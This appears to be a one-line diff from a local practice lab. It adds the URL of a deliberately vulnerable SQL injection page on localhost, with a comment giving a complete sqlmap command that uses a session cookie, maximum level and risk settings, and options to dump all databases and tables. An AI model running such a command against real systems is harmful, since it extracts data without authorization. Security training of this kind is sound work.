@@ -1,0 +1,1 @@
+http://localhost:8888/vulnerabilities/sqli/?id=1&Submit=Submit (GET)  # /usr/bin/sqlmap -u http://localhost:8888/vulnerabilities/sqli/?id=1&Submit=Submit "--cookie=PHPSESSID=xxxxxxxx; security=low" --batch --dbs --tables --dump --level=3 --risk=3 -o --output-dir=sqlmap-report-27022026-0527
